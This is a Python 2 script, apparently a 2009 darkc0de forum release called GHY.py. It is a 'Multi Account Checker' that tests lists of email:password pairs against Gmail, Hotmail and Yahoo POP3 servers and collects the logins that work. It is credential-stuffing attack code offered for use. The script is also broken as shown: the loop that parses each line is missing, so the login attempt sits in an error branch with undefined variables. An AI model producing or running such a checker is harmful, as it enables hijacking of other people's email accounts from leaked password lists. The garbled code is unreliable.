#!/usr/bin/python 
# 
#                                                              # 
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#    You only get smarter, by playing a smarter opponent!      # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
#                                                              # 
# 
#code: p47r1ck 
#name: GHY.py 
#version 1.0 
# 
#IMPORTANT!!! 
# 
# 
#    "You only get smarter 
#          by playing a smarter opponent!" 
#                by P47r1ck 
# 
#  Thanks to : 3l3c7r1c [ Happy Now ? ] 
# 
 
import sys, poplib, os 
os.system(['clear','cls'][os.name == 'nt']) 
def printHelp(): 
    print '\nUsage: ./GHY.py <domain> <emails>' 
    print 'Ex:    ./GHY.py yahoo emails.txt' 
    print 'Ex:    ./GHY.py gmail emails.txt' 
    print 'Ex:    ./GHY.py hotmail emails.txt' 
    print '\nNote: The accounts must be in the following format: user@mail.com:password\n' 
 
print "\n********************************************************************" 
print "*Multi Account Checker !!!*" 
print "* Gmail - Hotmail - Yahoo *" 
print "*    Coded by P47r1ck!    *" 
print "*    www.darkc0de.com     *" 
print "*         07/2009         *" 
print "********************************************************************" 
 
if len(sys.argv) != 3: 
    printHelp() 
    exit(1) 
SAVEFILE = 'valid_emails.txt' 
if sys.argv[1] == "hotmail": 
    HOST = 'pop3.live.com' 
    PORT = 995 
    print '\nChecking Hotmail Account Now\n' 
else: 
    pass 
if sys.argv[1] == "gmail": 
    HOST = 'pop.gmail.com' 
    PORT = 995 
    print '\nChecking Gmail Account Now\n' 
else: 
    pass 
if sys.argv[1] == "yahoo": 
    HOST = 'plus.pop.mail.yahoo.com' 
    PORT = 995 
    print '\nChecking Yahoo Account Now\n' 
 
 
 
# Do not change anything below. 
maillist = sys.argv[2] 
valid = [] 
currline = 0 
 
try: 
    handle = open(maillist) 
except: 
    print '\n[-] I can not open the mail list.Dude!!! Be carefull!!!' 
    print '\n[-] Leaving... Ciao!' 
    exit(1) 
 
    try: 
        pop = poplib.POP3_SSL(HOST, PORT) 
        pop.user(email) 
        pop.pass_(password) 
        valid.append(email + ':' + password) 
        print '\n[+] Checking: %s <%s> -> Valid!\n' % (email, password) 
        pop.quit() 
    except: 
        print '[+] Checking: %s <%s> -> Invalid!' % (email, password) 
        pass 
 
print '\n[+] Total Valid: %s' % len(valid) 
print '\n[+] Done.\n' 

